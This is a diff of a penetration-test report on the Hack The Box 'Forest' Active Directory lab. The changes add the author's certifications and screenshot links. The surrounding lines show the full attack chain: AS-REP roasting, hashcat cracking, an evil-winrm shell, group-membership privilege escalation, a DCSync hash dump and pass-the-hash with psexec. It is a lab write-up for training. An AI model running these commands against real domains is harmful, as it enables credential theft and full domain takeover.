@@ -4,9 +4,13 @@
 ## Forest Environment
 
 **Assessment Type:** Internal Penetration Test
+
 **Target System:** Active Directory Domain Controller
+
 **Domain:** htb.local
-**Prepared by:** Tanvir Ahmed
+
+**Prepared by:** Tanvir Ahmed (OSCP+, CEH, AZ-500, SC-200, ISO27001)
+
 **Date:** 2026
 
 ---
@@ -126,6 +130,7 @@ Attackers can perform **AS-REP Roasting**, retrieving Kerberos authentication ma
 ```bash
 impacket-GetNPUsers htb.local/ -dc-ip 10.129.154.248 -usersfile users.txt
 ```
+<img width="1097" height="667" alt="image" src="https://github.com/user-attachments/assets/6328e936-4568-448d-8f61-30eb99c2af73" />
 
 The retrieved hashes were cracked offline, revealing valid credentials.
 
@@ -156,6 +161,7 @@ Password cracking was performed using an offline dictionary attack.
 ```bash
 hashcat -m 18200 hashes.txt rockyou.txt
 ```
+<img width="902" height="163" alt="image" src="https://github.com/user-attachments/assets/0d7a4932-73a4-4f8c-b76f-1d03fb9c8790" />
 
 ### Recommendation
 
@@ -182,6 +188,7 @@ Authenticated attackers could execute commands remotely on the system.
 ```bash
 evil-winrm -i 10.129.154.248 -u svc-alfresco -p <password>
 ```
+<img width="1115" height="535" alt="image" src="https://github.com/user-attachments/assets/0e8a225f-251a-4f93-9ec1-0ba4a2fb8738" />
 
 ### Recommendation
 
@@ -210,6 +217,7 @@ Privilege escalation was achieved by abusing group membership permissions.
 ```powershell
 Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members attacker
 ```
+<img width="1099" height="632" alt="image" src="https://github.com/user-attachments/assets/42bcedd7-4462-41d3-ab65-f74f84ad1921" />
 
 ### Recommendation
 
@@ -236,6 +244,7 @@ This enabled a **DCSync attack**, allowing extraction of password hashes for all
 ```bash
 impacket-secretsdump htb.local/user@10.129.154.248
 ```
+<img width="1201" height="530" alt="image" src="https://github.com/user-attachments/assets/367da947-4ef8-4cb4-bb2c-9f3280230346" />
 
 ### Recommendation
 
@@ -262,6 +271,7 @@ This resulted in full administrative access to the domain controller.
 ```bash
 impacket-psexec administrator@10.129.154.248 -hashes <NTLM_HASH>
 ```
+<img width="1094" height="143" alt="image" src="https://github.com/user-attachments/assets/5e68dd82-a474-47b4-9c7b-2bebf358bfbe" />
 
 ### Recommendation
 
